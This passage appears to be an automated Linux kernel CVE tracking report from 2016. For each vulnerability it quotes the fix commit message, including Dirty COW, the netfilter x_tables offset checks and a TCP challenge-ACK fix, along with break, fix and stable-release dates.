     ffff880064e21800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
     ffff880064e21880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
    ==================================================================
    
    Fixes: 273ec51dd7ce ("net: ppp_generic - introduce net-namespace functionality v2")
    Reported-by: Baozeng Ding <sploving1@gmail.com>
    Signed-off-by: Guillaume Nault <g.nault@alphalink.fr>
    Reviewed-by: Cyrill Gorcunov <gorcunov@openvz.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/net/ppp/ppp_generic.c |    4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4805
Break Date: 2009-01-21
Break Commit: 273ec51dd7ceaa76e038875d85061ec856d8905e
Break Tag: 2.6
Linus Fix Date: 2016-03-23
Linus Commit: 1f461dcdd296eecedaffffc6bae2bfa90bd7eb89
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 2d6c3459438d6c0bab867b79c35db7e154648ad1
Stable Tag: 3.14.67

CVE-2016-4913:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.70.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 99d825822eade8d827a1817357cbf3f889a552d6
Author: Al Viro <viro@zeniv.linux.org.uk>
Date:   Thu May 5 16:25:35 2016 -0400

    get_rock_ridge_filename(): handle malformed NM entries
    
    Payloads of NM entries are not supposed to contain NUL.  When we run
    into such, only the part prior to the first NUL goes into the
    concatenation (i.e. the directory entry name being encoded by a bunch
    of NM entries).  We do stop when the amount collected so far + the
    claimed amount in the current NM entry exceed 254.  So far, so good,
    but what we return as the total length is the sum of *claimed*
    sizes, not the actual amount collected.  And that can grow pretty
    large - not unlimited, since you'd need to put CE entries in
    between to be able to get more than the maximum that could be
    contained in one isofs directory entry / continuation chunk and
    we are stop once we'd encountered 32 CEs, but you can get about 8Kb
    easily.  And that's what will be passed to readdir callback as the
    name length.  8Kb __copy_to_user() from a buffer allocated by
    __get_free_page()
    
    Cc: stable@vger.kernel.org # 0.98pl6+ (yes, really)
    Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

 fs/isofs/rock.c |   13 ++++++++++---
 1 file changed, 10 insertions(+), 3 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4913
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-07
Linus Commit: 99d825822eade8d827a1817357cbf3f889a552d6
Linus Tag: 4.6
Stable Date: 2016-05-18
Stable Commit: dc7e3177f3cefcbecda0e4266cd554866ff2caea
Stable Tag: 3.14.70

CVE-2016-4951:
1a1a143daf84db95dd7212086042004a3abb7bc2:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 45e093ae2830cd1264677d47ff9a95a71f5d9f9c
Author: Richard Alpe <richard.alpe@ericsson.com>
Date:   Mon May 16 11:14:54 2016 +0200

    tipc: check nl sock before parsing nested attributes
    
    Make sure the socket for which the user is listing publication exists
    before parsing the socket netlink attributes.
    
    Prior to this patch a call without any socket caused a NULL pointer
    dereference in tipc_nl_publ_dump().
    
    Tested-and-reported-by: Baozeng Ding <sploving1@gmail.com>
    Signed-off-by: Richard Alpe <richard.alpe@ericsson.com>
    Acked-by: Jon Maloy <jon.maloy@ericsson.cm>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/tipc/socket.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-23
CVE: CVE-2016-4951
Break Date: 2014-11-21
Break Commit: 1a1a143daf84db95dd7212086042004a3abb7bc2
Break Tag: 3.19
Linus Fix Date: 2016-05-16
Linus Commit: 45e093ae2830cd1264677d47ff9a95a71f5d9f9c
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:50 2016 +0100

    netfilter: x_tables: make sure e->next_offset covers remaining blob size
    
    Otherwise this function may read data beyond the ruleset blob.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |    6 ++++--
 net/ipv4/netfilter/ip_tables.c  |    6 ++++--
 net/ipv6/netfilter/ip6_tables.c |    6 ++++--
 3 files changed, 12 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: e0b84cd87763c3bd442a06942ca90a60a7e152e7
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit bdf533de6968e9686df777dc178486f600c6e617
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:49 2016 +0100

    netfilter: x_tables: validate e->target_offset early
    
    We should check that e->target_offset is sane before
    mark_source_chains gets called since it will fetch the target entry
    for loop detection.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |   17 ++++++++---------
 net/ipv4/netfilter/ip_tables.c  |   17 ++++++++---------
 net/ipv6/netfilter/ip6_tables.c |   17 ++++++++---------
 3 files changed, 24 insertions(+), 27 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: bdf533de6968e9686df777dc178486f600c6e617
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: 411c8508d4d0cb1e75343da53aaf26764bf4b9fe
Stable Tag: 3.14.73

CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Author: Florian Westphal <fw@strlen.de>
Date:   Fri Apr 1 14:17:28 2016 +0200

    netfilter: x_tables: check for bogus target offset
    
    We're currently asserting that targetoff + targetsize <= nextoff.
    
    Extend it to also check that targetoff is >= sizeof(xt_entry).
    Since this is generic code, add an argument pointing to the start of the
    match/target, we can then derive the base structure size from the delta.
    
    We also need the e->elems pointer in a followup change to validate matches.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 include/linux/netfilter/x_tables.h |    4 ++--
 net/ipv4/netfilter/arp_tables.c    |    5 +++--
 net/ipv4/netfilter/ip_tables.c     |    5 +++--
 net/ipv6/netfilter/ip6_tables.c    |    5 +++--
 net/netfilter/x_tables.c           |   17 +++++++++++++++--
 5 files changed, 26 insertions(+), 10 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-4997
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-14
Linus Commit: ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Linus Tag: 4.7
Stable Date: 2016-06-24
Stable Commit: f216289025f02e99628d6783f251f3a9d1966cad
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:50 2016 +0100

    netfilter: x_tables: make sure e->next_offset covers remaining blob size
    
    Otherwise this function may read data beyond the ruleset blob.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |    6 ++++--
 net/ipv4/netfilter/ip_tables.c  |    6 ++++--
 net/ipv6/netfilter/ip6_tables.c |    6 ++++--
 3 files changed, 12 insertions(+), 6 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: 6e94e0cfb0887e4013b3b930fa6ab1fe6bb6ba91
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: e0b84cd87763c3bd442a06942ca90a60a7e152e7
Stable Tag: 3.14.73

CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit bdf533de6968e9686df777dc178486f600c6e617
Author: Florian Westphal <fw@strlen.de>
Date:   Tue Mar 22 18:02:49 2016 +0100

    netfilter: x_tables: validate e->target_offset early
    
    We should check that e->target_offset is sane before
    mark_source_chains gets called since it will fetch the target entry
    for loop detection.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 net/ipv4/netfilter/arp_tables.c |   17 ++++++++---------
 net/ipv4/netfilter/ip_tables.c  |   17 ++++++++---------
 net/ipv6/netfilter/ip6_tables.c |   17 ++++++++---------
 3 files changed, 24 insertions(+), 27 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3134
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-28
Linus Commit: bdf533de6968e9686df777dc178486f600c6e617
Linus Tag: 4.6
Stable Date: 2016-06-24
Stable Commit: 411c8508d4d0cb1e75343da53aaf26764bf4b9fe
Stable Tag: 3.14.73

CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4997:
CVE-2016-4998:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.73.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Author: Florian Westphal <fw@strlen.de>
Date:   Fri Apr 1 14:17:28 2016 +0200

    netfilter: x_tables: check for bogus target offset
    
    We're currently asserting that targetoff + targetsize <= nextoff.
    
    Extend it to also check that targetoff is >= sizeof(xt_entry).
    Since this is generic code, add an argument pointing to the start of the
    match/target, we can then derive the base structure size from the delta.
    
    We also need the e->elems pointer in a followup change to validate matches.
    
    Signed-off-by: Florian Westphal <fw@strlen.de>
    Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

 include/linux/netfilter/x_tables.h |    4 ++--
 net/ipv4/netfilter/arp_tables.c    |    5 +++--
 net/ipv4/netfilter/ip_tables.c     |    5 +++--
 net/ipv6/netfilter/ip6_tables.c    |    5 +++--
 net/netfilter/x_tables.c           |   17 +++++++++++++++--
 5 files changed, 26 insertions(+), 10 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-4997
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-14
Linus Commit: ce683e5f9d045e5d67d1312a42b359cb2ab2a13c
Linus Tag: 4.7
Stable Date: 2016-06-24
Stable Commit: f216289025f02e99628d6783f251f3a9d1966cad
Stable Tag: 3.14.73

CVE-2016-5195:
CVE-2016-5195:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
Author: Linus Torvalds <torvalds@linux-foundation.org>
Date:   Thu Oct 13 13:07:36 2016 -0700

    mm: remove gup_flags FOLL_WRITE games from __get_user_pages()
    
    This is an ancient bug that was actually attempted to be fixed once
    (badly) by me eleven years ago in commit 4ceb5db9757a ("Fix
    get_user_pages() race for write access") but that was then undone due to
    problems on s390 by commit f33ea7f404e5 ("fix get_user_pages bug").
    
    In the meantime, the s390 situation has long been fixed, and we can now
    fix it by checking the pte_dirty() bit properly (and do it better).  The
    s390 dirty bit was implemented in abf09bed3cce ("s390/mm: implement
    software dirty bits") which made it into v3.9.  Earlier kernels will
    have to look at the page state itself.
    
    Also, the VM has become more scalable, and what used a purely
    theoretical race back then has become easier to trigger.
    
    To fix it, we introduce a new internal FOLL_COW flag to mark the "yes,
    we already did a COW" rather than play racy games with FOLL_WRITE that
    is very fundamental, and then use the pte dirty flag to validate that
    the FOLL_COW flag is still valid.
    
    Reported-and-tested-by: Phil "not Paul" Oester <kernel@linuxace.com>
    Acked-by: Hugh Dickins <hughd@google.com>
    Reviewed-by: Michal Hocko <mhocko@suse.com>
    Cc: Andy Lutomirski <luto@kernel.org>
    Cc: Kees Cook <keescook@chromium.org>
    Cc: Oleg Nesterov <oleg@redhat.com>
    Cc: Willy Tarreau <w@1wt.eu>
    Cc: Nick Piggin <npiggin@gmail.com>
    Cc: Greg Thelen <gthelen@google.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 include/linux/mm.h |    1 +
 mm/gup.c           |   14 ++++++++++++--
 2 files changed, 13 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-18
CVE: CVE-2016-5195
Break Date: 2007-05-07
Break Commit: 0a27a14a62921b438bb6f33772690d345a089be6
Break Tag: 2.6
Linus Fix Date: 2016-10-18
Linus Commit: 19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5243:
CVE-2016-5243:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Thu Jun 2 04:04:56 2016 -0400

    tipc: fix an infoleak in tipc_nl_compat_link_dump
    
    link_info.str is a char array of size 60. Memory after the NULL
    byte is not initialized. Sending the whole object out can cause
    a leak.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/tipc/netlink_compat.c |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5243
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-02
Linus Commit: 5d2be1422e02ccd697ccfcd45c85b4a26e6178e2
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5244:
CVE-2016-5244:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4116def2337991b39919f3b448326e21c40e0dbb
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Thu Jun 2 04:11:20 2016 -0400

    rds: fix an infoleak in rds_inc_info_copy
    
    The last field "flags" of object "minfo" is not initialized.
    Copying this object out may leak kernel stack data.
    Assign 0 to it to avoid leak.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/rds/recv.c |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5244
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-06-02
Linus Commit: 4116def2337991b39919f3b448326e21c40e0dbb
Linus Tag: 4.7
Stable Date: 2016-09-11
Stable Commit: d57906c6850c5bb9a93841da3deb6df53135d133
Stable Tag: 3.14.79

CVE-2016-5400:
CVE-2016-5400:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit aa93d1fee85c890a34f2510a310e55ee76a27848
Author: James Patrick-Evans <james@jmp-e.com>
Date:   Fri Jul 15 16:40:45 2016 +0100

    media: fix airspy usb probe error path
    
    Fix a memory leak on probe error of the airspy usb device driver.
    
    The problem is triggered when more than 64 usb devices register with
    v4l2 of type VFL_TYPE_SDR or VFL_TYPE_SUBDEV.
    
    The memory leak is caused by the probe function of the airspy driver
    mishandeling errors and not freeing the corresponding control structures
    when an error occours registering the device to v4l2 core.
    
    A badusb device can emulate 64 of these devices, and then through
    continual emulated connect/disconnect of the 65th device, cause the
    kernel to run out of RAM and crash the kernel, thus causing a local DOS
    vulnerability.
    
    Fixes CVE-2016-5400
    
    Signed-off-by: James Patrick-Evans <james@jmp-e.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Cc: stable@vger.kernel.org # 3.17+
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 drivers/media/usb/airspy/airspy.c |    3 +--
 1 file changed, 1 insertion(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5400
Break Date: 2014-07-21
Break Commit: f3e775962ccbc62bd93f2200b82db88af05d0137
Break Tag: 3.17
Linus Fix Date: 2016-07-16
Linus Commit: aa93d1fee85c890a34f2510a310e55ee76a27848
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5412:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 93d17397e4e2182fdaad503e2f9da46202c0f1c3
Author: Paul Mackerras <paulus@ozlabs.org>
Date:   Wed Jun 22 15:52:55 2016 +1000

    KVM: PPC: Book3S HV: Save/restore TM state in H_CEDE
    
    It turns out that if the guest does a H_CEDE while the CPU is in
    a transactional state, and the H_CEDE does a nap, and the nap
    loses the architected state of the CPU (which is is allowed to do),
    then we lose the checkpointed state of the virtual CPU.  In addition,
    the transactional-memory state recorded in the MSR gets reset back
    to non-transactional, and when we try to return to the guest, we take
    a TM bad thing type of program interrupt because we are trying to
    transition from non-transactional to transactional with a hrfid
    instruction, which is not permitted.
    
    The result of the program interrupt occurring at that point is that
    the host CPU will hang in an infinite loop with interrupts disabled.
    Thus this is a denial of service vulnerability in the host which can
    be triggered by any guest (and depending on the guest kernel, it can
    potentially triggered by unprivileged userspace in the guest).
    
    This vulnerability has been assigned the ID CVE-2016-5412.
    
    To fix this, we save the TM state before napping and restore it
    on exit from the nap, when handling a H_CEDE in real mode.  The
    case where H_CEDE exits to host virtual mode is already OK (as are
    other hcalls which exit to host virtual mode) because the exit
    path saves the TM state.
    
    Cc: stable@vger.kernel.org # v3.15+
    Signed-off-by: Paul Mackerras <paulus@ozlabs.org>

 arch/powerpc/kvm/book3s_hv_rmhandlers.S |   13 +++++++++++++
 1 file changed, 13 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5412
Break Date: 2014-03-29
Break Commit: e4e38121507a27d2ccc4b28d9e7fc4818a12c44c
Break Tag: 3.15
Linus Fix Date: 2016-07-28
Linus Commit: 93d17397e4e2182fdaad503e2f9da46202c0f1c3
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5412:
CVE-2016-5412:
3.15:
CVE-2016-5412:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit f024ee098476a3e620232e4a78cfac505f121245
Author: Paul Mackerras <paulus@ozlabs.org>
Date:   Wed Jun 22 14:21:59 2016 +1000

    KVM: PPC: Book3S HV: Pull out TM state save/restore into separate procedures
    
    This moves the transactional memory state save and restore sequences
    out of the guest entry/exit paths into separate procedures.  This is
    so that these sequences can be used in going into and out of nap
    in a subsequent patch.
    
    The only code changes here are (a) saving and restore LR on the
    stack, since these new procedures get called with a bl instruction,
    (b) explicitly saving r1 into the PACA instead of assuming that
    HSTATE_HOST_R1(r13) is already set, and (c) removing an unnecessary
    and redundant setting of MSR[TM] that should have been removed by
    commit 9d4d0bdd9e0a ("KVM: PPC: Book3S HV: Add transactional memory
    support", 2013-09-24) but wasn't.
    
    Cc: stable@vger.kernel.org # v3.15+
    Signed-off-by: Paul Mackerras <paulus@ozlabs.org>

 arch/powerpc/kvm/book3s_hv_rmhandlers.S |  449 ++++++++++++++++---------------
 1 file changed, 237 insertions(+), 212 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5412
Break Date: 2014-03-29
Break Commit: e4e38121507a27d2ccc4b28d9e7fc4818a12c44c
Break Tag: 3.15
Linus Fix Date: 2016-07-28
Linus Commit: f024ee098476a3e620232e4a78cfac505f121245
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
CVE-2016-5696:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Author: Eric Dumazet <edumazet@google.com>
Date:   Sun Jul 10 10:04:02 2016 +0200

    tcp: make challenge acks less predictable
    
    Yue Cao claims that current host rate limiting of challenge ACKS
    (RFC 5961) could leak enough information to allow a patient attacker
    to hijack TCP sessions. He will soon provide details in an academic
    paper.
    
    This patch increases the default limit from 100 to 1000, and adds
    some randomization so that the attacker can no longer hijack
    sessions without spending a considerable amount of probes.
    
    Based on initial analysis and patch from Linus.
    
    Note that we also have per socket rate limiting, so it is tempting
    to remove the host limit in the future.
    
    v2: randomize the count of challenge acks per second, not the period.
    
    Fixes: 282f23c6ee34 ("tcp: implement RFC 5961 3.2")
    Reported-by: Yue Cao <ycao009@ucr.edu>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Acked-by: Yuchung Cheng <ycheng@google.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/ipv4/tcp_input.c |   15 ++++++++++-----
 1 file changed, 10 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5696
Break Date: 2012-07-17
Break Commit: 282f23c6ee343126156dd41218b22ece96d747e3
Break Tag: 3.6
Linus Fix Date: 2016-07-11
Linus Commit: 75ff39ccc1bd5d3c455b6822ab09e533c551f758
Linus Tag: 4.7
Stable Date: 2016-08-16
Stable Commit: 860c53258e634c54f70252c352bae7bac30724a9
Stable Tag: 3.14.76

CVE-2016-5728:
CVE-2016-5728:
CVE-2016-5728:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5728:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9bf292bfca94694a721449e3fd752493856710f6
Author: Ashutosh Dixit <ashutosh.dixit@intel.com>
Date:   Wed Apr 27 14:36:05 2016 -0700

    misc: mic: Fix for double fetch security bug in VOP driver
    
    The MIC VOP driver does two successive reads from user space to read a
    variable length data structure. Kernel memory corruption can result if
    the data structure changes between the two reads. This patch disallows
    the chance of this happening.
    
    Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=116651
    Reported by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Sudeep Dutt <sudeep.dutt@intel.com>
    Signed-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/misc/mic/vop/vop_vringh.c |    5 +++++
 1 file changed, 5 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-5728
Break Date: 2013-09-26
Break Commit: f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5
Break Tag: 3.13
Linus Fix Date: 2016-04-27
Linus Commit: 9bf292bfca94694a721449e3fd752493856710f6
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5828:
CVE-2016-5828:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5828:
CVE-2016-5828:
CVE-2016-5828:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 8e96a87c5431c256feb65bcfc5aec92d9f7839b6
Author: Cyril Bur <cyrilbur@gmail.com>
Date:   Fri Jun 17 14:58:34 2016 +1000

    powerpc/tm: Always reclaim in start_thread() for exec() class syscalls
    
    Userspace can quite legitimately perform an exec() syscall with a
    suspended transaction. exec() does not return to the old process, rather
    it load a new one and starts that, the expectation therefore is that the
    new process starts not in a transaction. Currently exec() is not treated
    any differently to any other syscall which creates problems.
    
    Firstly it could allow a new process to start with a suspended
    transaction for a binary that no longer exists. This means that the
    checkpointed state won't be valid and if the suspended transaction were
    ever to be resumed and subsequently aborted (a possibility which is
    exceedingly likely as exec()ing will likely doom the transaction) the
    new process will jump to invalid state.
    
    Secondly the incorrect attempt to keep the transactional state while
    still zeroing state for the new process creates at least two TM Bad
    Things. The first triggers on the rfid to return to userspace as
    start_thread() has given the new process a 'clean' MSR but the suspend
    will still be set in the hardware MSR. The second TM Bad Thing triggers
    in __switch_to() as the processor is still transactionally suspended but
    __switch_to() wants to zero the TM sprs for the new process.
    
    This is an example of the outcome of calling exec() with a suspended
    transaction. Note the first 700 is likely the first TM bad thing
    decsribed earlier only the kernel can't report it as we've loaded
    userspace registers. c000000000009980 is the rfid in
    fast_exception_return()
    
      Bad kernel stack pointer 3fffcfa1a370 at c000000000009980
      Oops: Bad kernel stack pointer, sig: 6 [#1]
      CPU: 0 PID: 2006 Comm: tm-execed Not tainted
      NIP: c000000000009980 LR: 0000000000000000 CTR: 0000000000000000
      REGS: c00000003ffefd40 TRAP: 0700   Not tainted
      MSR: 8000000300201031 <SF,ME,IR,DR,LE,TM[SE]>  CR: 00000000  XER: 00000000
      CFAR: c0000000000098b4 SOFTE: 0
      PACATMSCRATCH: b00000010000d033
      GPR00: 0000000000000000 00003fffcfa1a370 0000000000000000 0000000000000000
      GPR04: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR08: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
      GPR12: 00003fff966611c0 0000000000000000 0000000000000000 0000000000000000
      NIP [c000000000009980] fast_exception_return+0xb0/0xb8
      LR [0000000000000000]           (null)
      Call Trace:
      Instruction dump:
      f84d0278 e9a100d8 7c7b03a6 e84101a0 7c4ff120 e8410170 7c5a03a6 e8010070
      e8410080 e8610088 e8810090 e8210078 <4c000024> 48000000 e8610178 88ed023b
    
      Kernel BUG at c000000000043e80 [verbose debug info unavailable]
      Unexpected TM Bad Thing exception at c000000000043e80 (msr 0x201033)
      Oops: Unrecoverable exception, sig: 6 [#2]
      CPU: 0 PID: 2006 Comm: tm-execed Tainted: G      D
      task: c0000000fbea6d80 ti: c00000003ffec000 task.ti: c0000000fb7ec000
